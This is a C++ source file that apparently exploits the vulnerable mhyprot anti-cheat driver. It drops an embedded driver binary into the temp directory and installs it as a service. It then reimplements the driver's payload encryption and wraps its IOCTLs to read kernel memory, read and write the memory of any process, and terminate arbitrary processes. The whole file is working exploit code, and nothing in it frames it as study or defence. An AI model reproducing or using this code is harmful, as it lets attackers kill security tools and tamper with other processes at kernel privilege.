#include "mhyprotect.h"

 //
 // initialization of its service and device
 //
bool mhyprotect::init()
{
	char temp_path[MAX_PATH];
	const uint32_t length = GetTempPath(sizeof(temp_path), temp_path);

	if (length > MAX_PATH || !length)
		return false;

	//
	// place the driver binary into the temp path
	//
	const std::string placement_path = std::string(temp_path) + MHYPROT_SYSFILE_NAME;

	if (std::filesystem::exists(placement_path))
		std::remove(placement_path.c_str());

	//
	// create driver sys from memory
	//
	if (!file_utils::create_file_from_buffer(placement_path, (void*)resource::raw_driver, sizeof(resource::raw_driver)))
		return false;

	//
	// create service using winapi, this needs administrator privileage
	//
	detail::mhyplot_service_handle = service_utils::create_service(placement_path);

	if (!CHECK_HANDLE(detail::mhyplot_service_handle))
		return false;

	//
	// start the service
	//
	if (!service_utils::start_service(detail::mhyplot_service_handle))
		return false;

	//
	// open the handle of its driver device
	//
	detail::device_handle = CreateFile(TEXT(MHYPROT_DEVICE_NAME), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, NULL, NULL);

	if (!CHECK_HANDLE(detail::device_handle))
		return false;

	return true;
}

void mhyprotect::unload()
{
	if (detail::device_handle)
	{
		CloseHandle(detail::device_handle);
	}

	if (detail::mhyplot_service_handle)
	{
		service_utils::stop_service(detail::mhyplot_service_handle);
		service_utils::delete_service(detail::mhyplot_service_handle);
	}
}

void mhyprotect::clean()
{
	service_utils::delete_service_with_check(MHYPROT_SERVICE_NAME);
}

bool mhyprotect::driver_impl::request_ioctl(DWORD ioctl_code, LPVOID in_buffer, DWORD in_buffer_size)
{
	//
	// allocate memory for this command result
	//
	LPVOID out_buffer = calloc(1, in_buffer_size);
	DWORD out_buffer_size;

	if (!out_buffer)
		return false;

	//
	// send the ioctl request
	//
	const bool result = DeviceIoControl(mhyprotect::detail::device_handle, ioctl_code, in_buffer, in_buffer_size, out_buffer, in_buffer_size, &out_buffer_size, NULL);

	//
	// store the result
	//
	if (out_buffer_size)
		memcpy(in_buffer, out_buffer, out_buffer_size);

	free(out_buffer);

	return result;
}

//
// initialize driver implementations with payload encryption requirements
//
bool mhyprotect::driver_impl::driver_init()
{
	//
	// the driver initializer
	//
	MHYPROT_INITIALIZE initializer;
	initializer._m_002 = 0x0BAEBAEEC;
	initializer._m_003 = 0x0EBBAAEF4FFF89042;

	if (!request_ioctl(MHYPROT_IOCTL_INITIALIZE, &initializer, sizeof(initializer)))
		return false;

	//
	// driver's base address in the system
	//
	uint64_t mhyprot_address = win_utils::obtain_sysmodule_address(MHYPROT_SYSFILE_NAME);

	if (!mhyprot_address)
		return false;

	//
	// read the pointer that points to the seedmap that used to encrypt payloads
	// the pointer on the [driver.sys + 0xA0E8]
	//
	uint64_t seedmap_address = driver_impl::read_kernel_memory<uint64_t>(mhyprot_address + MHYPROT_OFFSET_SEEDMAP);
	if (!seedmap_address)
		return false;


	if (!driver_impl::read_kernel_memory(seedmap_address, &detail::seedmap, sizeof(detail::seedmap)))
	{
		return false;
	}

	return true;
}

//
// generate a key for the payload
//
uint64_t mhyprotect::driver_impl::generate_key(uint64_t seed)
{
	uint64_t k = ((((seed >> 29) & 0x555555555 ^ seed) & 0x38EB3FFFF6D3) << 17) ^ (seed >> 29) & 0x555555555 ^ seed;
	return ((k & 0xFFFFFFFFFFFFBF77u) << 37) ^ k ^ ((((k & 0xFFFFFFFFFFFFBF77u) << 37) ^ k) >> 43);
}

//
// encrypt the payload
//
void mhyprotect::driver_impl::encrypt_payload(void* payload, size_t size)
{
	if (size % 8)
		return;

	if (size / 8 >= 312)
		return;

	uint64_t* p_payload = (uint64_t*)payload;
	DWORD64 key_to_base = 0;

	for (DWORD i = 1; i < size / 8; i++)
	{
		const uint64_t key = driver_impl::generate_key(detail::seedmap[i - 1]);
		p_payload[i] = p_payload[i] ^ key ^ (key_to_base + p_payload[0]);
		key_to_base += 0x10;
	}
}

//
// read memory from the kernel using vulnerable ioctl
//
bool mhyprotect::driver_impl::read_kernel_memory(uint64_t address, void* buffer, size_t size)
{
	if (!buffer)
		return false;

	DWORD payload_size = size + sizeof(DWORD);
	PMHYPROT_KERNEL_READ_REQUEST payload = (PMHYPROT_KERNEL_READ_REQUEST)calloc(1, payload_size);

	if (!payload)
		return false;

	payload->header.address = address;
	payload->size = size;

	if (!request_ioctl(MHYPROT_IOCTL_READ_KERNEL_MEMORY, payload, payload_size))
		return false;

	if (!payload->header.result)
	{
		memcpy(buffer, (PUCHAR)payload + 4, size);
		return true;
	}

	return false;
}

bool mhyprotect::driver_impl::terminate_process(const uint32_t process_id)
{
	MHYPROT_TERMINATE_PROCESS_REQUEST payload;

	payload.process_id = process_id;

	encrypt_payload(&payload, sizeof(payload));

	if (!request_ioctl(MHYPROT_IOCTL_TERMINATE_PROCESS, &payload, sizeof(payload)) || !payload.response)
		return false;

	return true;
}

bool mhyprotect::driver_impl::read_user_memory(uint32_t process_id, uint64_t address, void* buffer, size_t size)
{
	MHYPROT_USER_READ_WRITE_REQUEST payload;

	payload.action = MHYPROT_ACTION_READ;   // action code
	payload.process_id = process_id;        // target process id
	payload.address = address;              // address
	payload.buffer = (uint64_t)buffer;      // our buffer
	payload.size = size;                    // size

	encrypt_payload(&payload, sizeof(payload));

	return request_ioctl(MHYPROT_IOCTL_READ_WRITE_USER_MEMORY, &payload, sizeof(payload));
}

bool mhyprotect::driver_impl::write_user_memory(uint32_t process_id, uint64_t address, void* buffer, size_t size)
{
	MHYPROT_USER_READ_WRITE_REQUEST payload;

	payload.action = MHYPROT_ACTION_WRITE;  // action code
	payload.process_id = process_id;        // target process id
	payload.address = (uint64_t)buffer;     // our buffer
	payload.buffer = address;               // destination
	payload.size = size;                    // size

	encrypt_payload(&payload, sizeof(payload));

	return request_ioctl(MHYPROT_IOCTL_READ_WRITE_USER_MEMORY, &payload, sizeof(payload));
}